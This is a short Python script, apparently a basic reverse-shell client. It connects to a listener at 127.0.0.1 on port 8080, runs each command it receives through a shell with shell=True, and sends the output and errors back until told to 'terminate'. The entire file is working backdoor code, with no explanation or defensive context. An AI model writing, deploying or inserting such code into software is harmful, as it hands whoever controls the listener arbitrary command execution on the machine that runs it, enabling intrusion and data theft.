import socket
import subprocess

def connect():

    Mysocket = socket.socket()
    Mysocket.connect(("127.0.0.1", 8080))

    while True:

        command = Mysocket.recv(1024).decode()

        if "terminate" in command:
            Mysocket.close()
            break

        else:

            CMD = subprocess.Popen(
                command,
                shell=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            output = CMD.stdout.read()
            error = CMD.stderr.read()

            Mysocket.send(output)
            Mysocket.send(error)

def main():
    connect()

if __name__ == "__main__":
    main()
